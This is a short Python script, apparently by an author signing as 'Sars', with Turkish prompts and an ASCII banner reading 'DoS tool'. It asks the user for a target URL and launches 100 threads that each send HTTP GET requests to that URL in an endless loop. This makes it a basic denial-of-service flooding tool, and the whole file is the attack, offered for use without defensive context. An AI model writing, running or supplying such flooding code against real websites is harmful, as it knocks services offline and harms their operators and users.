import requests
import threading
import pyfiglet
print(pyfiglet.figlet_format("DoS tool"))
print("                                           [Created by Sars]")
def attack(url):
    while True:
        try:
            response = requests.get(url)
            print(f"İstek başarıyla gönderildi")
        except requests.exceptions.RequestException as e:
            print(f"Hata: {e}")
target_url = input("URL giriniz : ")
num_threads = 100
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=attack, args=(target_url,))
    t.start()
    threads.append(t)
for thread in threads:
    thread.join()
print("Saldırı durduruldu!")